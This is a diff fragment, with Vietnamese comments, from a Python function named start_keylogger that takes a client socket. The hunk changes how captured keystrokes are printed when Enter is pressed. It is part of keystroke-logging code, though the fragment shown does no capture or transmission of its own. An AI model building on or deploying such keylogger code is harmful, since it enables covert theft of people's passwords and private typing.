@@ -13,7 +13,9 @@ def start_keylogger(client_socket):
             key_str = f' {str(key)} '  # Xử lý các phím đặc biệt
 
         # Nếu phím nhấn là Enter
-        if key == keyboard.Key.enter:            
+        if key == keyboard.Key.enter:
+            # In ra các phím đã nhấn mà không tạo dòng mới
+            print(f'\rKeys pressed: {keys_pressed}')  # In ra trên cùng một dòng
             keys_pressed = ""  # Reset sau khi nhấn Enter
             print("Keys pressed: ", end='')  # Đưa con trỏ về đầu dòng để tiếp tục nhập
         else:
